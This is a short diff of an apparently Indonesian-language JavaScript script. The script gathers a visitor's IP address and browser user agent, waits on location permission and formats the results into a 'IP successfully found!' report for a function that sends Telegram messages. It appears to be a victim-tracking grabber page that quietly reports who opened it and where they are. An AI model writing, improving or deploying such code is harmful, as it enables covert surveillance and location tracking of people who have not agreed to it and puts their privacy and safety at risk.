@@ -114,7 +114,7 @@ async function kirimPesanTelegram(pesan) {
 
 (async () => {
   const ip = await getIP();
-  const merek = getMerekHP();
+  const merek = navigator.userAgent;
   const pesanAwal = `╭──「 IP berhasil ditemukan! 」──
 │🌐 Status: MENUNGGU IZIN LOKASI
 │📡 IP: ${ip}
